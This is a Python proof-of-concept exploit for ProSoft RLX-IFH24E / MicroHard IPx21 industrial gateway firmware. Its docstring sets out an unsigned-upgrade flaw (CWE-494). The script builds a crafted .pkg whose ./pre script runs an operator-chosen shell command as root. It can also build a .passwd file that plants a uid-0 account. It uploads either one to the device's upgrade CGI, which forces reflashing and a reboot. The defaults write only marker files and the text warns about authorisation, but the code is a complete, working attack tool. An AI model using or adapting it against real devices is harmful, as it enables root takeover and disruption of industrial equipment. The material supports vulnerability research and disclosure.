"""ProSoft RLX-IFH24E (RLX-IH 24E), system upgrade package RLX-IFH24E_v2244.pkg, version v2.2.44.

OEM platform: MicroHard Systems IPx21 ("MHX-910"), Intel IXP425 XScale, ARM big-endian,
Linux 2.4.24-uc0.

Chain:
    POST /cgi-bin/tool_reprogramming.cgi   (multipart/form-data, part name "file1")
      -> usr/lib/cgi-bin/tool_reprogramming.cgi : HandleSubmit @ 0x8d1c
      -> sprintf(buf, "%s /upgrade/upgrade/%s", tempfile, origfilename)   ; rodata 0x2b1c
      -> SubProgram_Start("/bin/mv", buf)             ; argv built by hand, no shell
      -> SubProgram_Start("/sbin/upgrade", origfilename)
      -> /sbin/upgrade (POSIX sh, runs with the CGI's privileges, i.e. root)
           dispatch on the file extension
           .pkg     : gunzip -t  ->  tar -xf  ->  PRODUCT_NAME == LOCK_NAME  ->  ./pre
                      ->  tar -xf extract/upgradepkg.tar -C /  ->  ./post  ->  reboot
           .passwd  : cp over /etc/passwd and /etc/passwd_original
           .factory : cp over /etc/db1

The only check between the HTTP request and root execution is a string equality between the
device's PRODUCT_NAME (from /etc/MHX_CONFIG) and the LOCK_NAME inside the uploaded archive.
Both operands are known to the attacker, so the check constrains nothing about authenticity:
no signature, no digest comparison, no content allowlist. CWE-494.

Verification status of this script, stated plainly: the installer half of the chain was
verified by executing the firmware's own unmodified /sbin/upgrade inside an isolated chroot
sandbox built from the package's rootfs, where the crafted .pkg produced "Match image." and
"Upgrade Successful", executed ./pre with PRE-RAN-AS-UID=0, applied the inner archive to /,
executed ./post and left every marker, while a structurally identical control package whose
only difference was LOCK_NAME=WRONGPRODUCT was refused with "This unit doesn't support the
image." and produced no markers. The upload half was recovered by disassembly only: no HTTP
request was ever issued to this product and no physical appliance was used. Running this
script against hardware you do not own or are not authorised in writing to test WILL reboot
and reimage that device.

Modes:
    (default)        build the package and, unless --build-only, POST it to the target
    --build-only     build and write the package locally; no network access at all
    --control        same build with a wrong LOCK_NAME, for a legitimate operator to confirm
                     on their own hardware that the only gate is that string
    --passwd-mode    build the account-database variant as a local file (never sent unless
                     --send is also given)

The default payload is non-destructive: ./pre touches one marker file and writes the
executing uid into a second, ./post touches a third. Nothing is deleted, encrypted or
modified besides those markers. Credential values and the target address are supplied by the
operator; nothing is hardcoded.

Authorized security research only. Python 3 standard library only.
"""

import argparse
import base64
import gzip
import hashlib
import io
import os
import ssl
import sys
import tarfile
import time
import urllib.error
import urllib.request

UPLOAD_PATH = "/cgi-bin/tool_reprogramming.cgi"
FORM_FIELD = "file1"
STAGING_DIR = "/upgrade/upgrade"
DEFAULT_LOCK_NAME = "IPx21PROSOFT"
CONTROL_LOCK_NAME = "WRONGPRODUCT"
DEFAULT_PRODUCT_NAME = "IPx21PROSOFT"
IMAGE_FILE = "upgradepkg.tar"
IMAGE_PATH = "extract"
DEFAULT_MARKER_TOKEN = "RLXIFH-MARKER"


def build_pre_script(cmd, token):
    lines = [
        "#!/bin/sh",
        "touch /%s_PRE_RAN" % token,
        "id -u > /%s_UID" % token,
        "echo PRE-RAN-AS-UID=$(id -u) >> /%s_UID" % token,
        cmd,
    ]
    return ("\n".join(lines) + "\n").encode()


def build_post_script(token):
    lines = ["#!/bin/sh", "touch /%s_POST_DONE" % token]
    return ("\n".join(lines) + "\n").encode()


def build_inner_archive(marker_name, marker_body):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as inner:
        info = tarfile.TarInfo(marker_name)
        info.size = len(marker_body)
        info.mode = 0o644
        info.mtime = 0
        inner.addfile(info, io.BytesIO(marker_body))
    return buf.getvalue()


def build_package(cmd, lock_name, product_name, token, inner_marker):
    file_meta = ("IMAGEFILE=%s\nIMAGEPATH=%s\n" % (IMAGE_FILE, IMAGE_PATH)).encode()
    lock_meta = ("LOCK_NAME=%s\nVERSION=vDemonstration\nPRODUCT_NAME=%s\n"
                 % (lock_name, product_name)).encode()
    pre = build_pre_script(cmd, token)
    post = build_post_script(token)
    inner_entry = inner_marker or ("%s_ROOTFS" % token)
    inner = build_inner_archive(inner_entry,
                                ("%s_ROOTFS_OVERWRITE=1\n" % token).encode())

    outer = io.BytesIO()
    with tarfile.open(fileobj=outer, mode="w") as tar:
        def add(name, data, mode):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = mode
            info.mtime = 0
            tar.addfile(info, io.BytesIO(data))
        add("file", file_meta, 0o644)
        add("lockfile", lock_meta, 0o644)
        add("pre", pre, 0o755)
        add("post", post, 0o755)
        add("%s/%s" % (IMAGE_PATH, IMAGE_FILE), inner, 0o644)

    raw = outer.getvalue()
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(raw)
    return buf.getvalue()


def build_passwd_file(entries):
    return ("\n".join(entries) + "\n").encode()


def upload(target, port, use_https, user, password, filename, body, timeout):
    boundary = "----RLXIFHBoundary%d" % int(time.time())
    head = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n" % (boundary, FORM_FIELD, filename))
    tail = "\r\n--%s--\r\n" % boundary
    payload = head.encode() + body + tail.encode()

    scheme = "https" if use_https else "http"
    url = "%s://%s:%d%s" % (scheme, target, port, UPLOAD_PATH)
    request = urllib.request.Request(url, data=payload, method="POST")
    request.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    request.add_header("Content-Length", str(len(payload)))
    request.add_header("User-Agent", "rlx-ifh24e-upgrade-poc/1.0")
    if user:
        token = base64.b64encode(("%s:%s" % (user, password or "")).encode()).decode()
        request.add_header("Authorization", "Basic %s" % token)

    context = None
    if use_https:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    try:
        response = urllib.request.urlopen(request, timeout=timeout, context=context)
        return response.getcode(), response.read(4096).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        detail = ""
        try:
            detail = exc.read(4096).decode("utf-8", "replace")
        except OSError:
            pass
        return exc.code, detail
    except urllib.error.URLError as exc:
        return -1, "URLError: %s" % exc.reason
    except OSError as exc:
        return -1, "OSError: %s" % exc


def sha256_hex(data):
    return hashlib.sha256(data).hexdigest()


def write_bytes(path, data):
    with open(path, "wb") as handle:
        handle.write(data)
    return os.path.abspath(path)


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Build (and optionally deliver) an unsigned upgrade package for "
                    "ProSoft RLX-IFH24E / MicroHard IPx21 OEM firmware. Research use only.")
    parser.add_argument("--target", default="127.0.0.1",
                        help="management address of the device (default: loopback, inert)")
    parser.add_argument("--port", type=int, default=80, help="management port (default: 80)")
    parser.add_argument("--https", action="store_true", help="use HTTPS instead of HTTP")
    parser.add_argument("--user", default="", help="HTTP Basic username; empty sends none")
    parser.add_argument("--password", default="", help="HTTP Basic password")
    parser.add_argument("--timeout", type=float, default=30.0, help="request timeout seconds")
    parser.add_argument("--cmd", default="true",
                        help="shell command placed in ./pre (default: inert 'true')")
    parser.add_argument("--filename", default="demonstration.pkg",
                        help="uploaded filename; its extension selects the installer branch "
                             "(no spaces, no path separators)")
    parser.add_argument("--lock-name", default=DEFAULT_LOCK_NAME,
                        help="LOCK_NAME written into the package lockfile")
    parser.add_argument("--product-name", default=DEFAULT_PRODUCT_NAME,
                        help="PRODUCT_NAME echoed by the lockfile metadata")
    parser.add_argument("--token", default=DEFAULT_MARKER_TOKEN,
                        help="marker file name prefix (default: %(default)s)")
    parser.add_argument("--inner-marker", default="rootfs_marker.txt",
                        help="entry name the inner archive writes under /")
    parser.add_argument("--out", default="", help="write the built package here instead of "
                                                  "the derived default name")
    parser.add_argument("--build-only", action="store_true",
                        help="build locally and stop; performs no network access")
    parser.add_argument("--control", action="store_true",
                        help="build the refusal case: identical package, wrong LOCK_NAME")
    parser.add_argument("--passwd-mode", action="store_true",
                        help="build the account-database variant as a local file")
    parser.add_argument("--passwd-entry", action="append", default=[],
                        help="repeatable passwd line, e.g. 'name:*:0:0:gecos:/root:/bin/sh'")
    parser.add_argument("--send", action="store_true",
                        help="with --passwd-mode, actually upload the built file")
    args = parser.parse_args(argv)

    if os.sep in args.filename or " " in args.filename:
        print("[-] the uploaded filename must contain no spaces and no path separators: "
              "SubProgram_Start splits its argument string on spaces before execvp",
              file=sys.stderr)
        return 2

    if args.passwd_mode:
        entries = args.passwd_entry or ["r00tmarker:*:0:0:INERT-DEMONSTRATION-ENTRY:/root:/bin/sh"]
        body = build_passwd_file(entries)
        out = args.out or "demonstration.passwd"
        path = write_bytes(out, body)
        print("[+] wrote account-database variant: %s (%d bytes, sha256 %s)"
              % (path, len(body), sha256_hex(body)))
        for line in entries:
            print("    | %s" % line)
        if not args.send:
            print("[*] not sent. Upload it under any .passwd name to exercise the branch; "
                  "/etc/passwd and /etc/passwd_original are both replaced.")
            return 0
        filename = args.filename if args.filename.endswith(".passwd") else "demonstration.passwd"
        code, detail = upload(args.target, args.port, args.https, args.user,
                              args.password, filename, body, args.timeout)
        print("[+] POST %s -> %s" % (UPLOAD_PATH, code))
        print(detail[:1200])
        return 0 if code == 200 else 1

    lock_name = CONTROL_LOCK_NAME if args.control else args.lock_name
    body = build_package(args.cmd, lock_name, args.product_name, args.token, args.inner_marker)
    out = args.out or ("demonstration-control.pkg" if args.control else "demonstration.pkg")
    path = write_bytes(out, body)
    print("[+] built %s: %d bytes, sha256 %s" % (path, len(body), sha256_hex(body)))
    print("    lockfile LOCK_NAME = %s" % lock_name)
    print("    ./pre command      = %s" % args.cmd)
    print("    inner archive entry = /%s" % args.inner_marker)
    print("    markers expected   = /%s_PRE_RAN, /%s_UID, /%s_POST_DONE"
          % (args.token, args.token, args.token))

    if args.build_only:
        print("[*] --build-only: no request sent.")
        return 0

    if args.control:
        print("[!] control package: the device should answer \"This unit doesn't support the "
              "image.\" and create no marker. If markers appear, the platform string is not "
              "the gate and the finding is broader than published.")

    code, detail = upload(args.target, args.port, args.https, args.user, args.password,
                          args.filename, body, args.timeout)
    print("[+] POST %s -> %s" % (UPLOAD_PATH, code))
    print(detail[:1200])
    if code == -1:
        print("[-] no HTTP response received; nothing was delivered.")
        return 1
    print("[*] on a real appliance the installer runs ./pre (root), applies "
        "%s/%s to /, runs ./post, then reboots unconditionally."
        % (IMAGE_PATH, IMAGE_FILE))
    print("[*] verify out of band: %s_UID should contain PRE-RAN-AS-UID=0" % args.token)
    return 0


if __name__ == "__main__":
    sys.exit(main())
